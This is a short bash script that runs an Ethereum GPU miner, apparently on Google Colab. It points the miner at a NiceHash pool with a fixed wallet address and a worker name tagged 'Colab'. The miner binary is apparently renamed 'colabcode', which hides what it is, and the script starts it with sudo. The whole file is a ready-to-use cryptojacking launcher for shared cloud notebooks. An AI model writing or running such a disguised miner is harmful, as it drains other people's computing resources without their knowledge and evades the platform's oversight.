#!/bin/bash
POOL=nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353
WALLET=35TuxzGVmh7mC1QbvHaZxaR44NdqEdpz5X
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Colab)

chmod +x colabcode
sudo ./colabcode -pool $POOL -wal $WALLET.$WORKER -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth -nvidia
